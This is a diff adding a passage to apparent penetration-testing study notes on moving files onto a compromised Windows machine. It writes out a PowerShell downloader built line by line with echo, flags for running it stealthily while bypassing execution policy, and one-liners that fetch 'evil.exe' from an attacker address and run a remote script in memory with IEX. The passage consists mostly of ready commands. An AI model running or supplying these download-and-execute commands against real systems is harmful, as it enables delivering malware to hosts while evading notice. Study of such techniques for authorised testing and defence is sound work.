@@ -43,5 +43,26 @@ Alternatively, with administrative access to the machine, we can disable Interne
 reg add "HKLM\SOFTWARE\Microsoft\Internet Explorer\Main" /f /v DisableFirstRunCustomize /t REG_DWORD /d 2
 ```
 
+```text
+echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+echo $url = "http://10.11.0.4/evil.exe" >>wget.ps1
+echo $file = "new-exploit.exe" >>wget.ps1
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
+```
 
+Now we can use PowerShell to run the script and download our file. However, to ensure both correct and stealthy execution, we specify a number of options in the execution of the script   
+  
+First, we must allow execution of PowerShell scripts \(which is restricted by default\) with the - ExecutionPolicy keyword and Bypass value. Next, we will use `-NoLogo` and `-NonInteractive` to hide the PowerShell logo banner and suppress the interactive PowerShell prompt, respectively. The `-NoProfile` keyword will prevent PowerShell from loading the default profile \(which is not needed\), and finally we specify the script file with `-File` 
+
+```text
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+```
+
+```text
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')
+```
+
+```text
+powershell.exe "IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')"
+```
 
